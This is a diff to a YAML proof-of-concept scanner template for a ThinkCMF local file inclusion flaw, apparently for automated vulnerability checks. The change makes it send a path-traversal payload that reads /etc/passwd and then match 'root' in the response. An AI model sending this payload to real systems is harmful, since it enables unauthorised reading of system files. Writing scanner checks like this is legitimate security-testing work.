@@ -2,9 +2,9 @@ name: poc-yaml-thinkcmf-lfi
 
 rules:
   - method: GET
-    path: "/?a=display&templateFile=Nginx.conf"
+    path: "/?a=display&templateFile=././.././.././.././.././.././.././.././.././.././.././etc/./passwd"
     expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(b"location /")))
+      response.status == 200 && response.body.bcontains(bytes(string(b"root")))
 
 detail:
   author: JerryKing
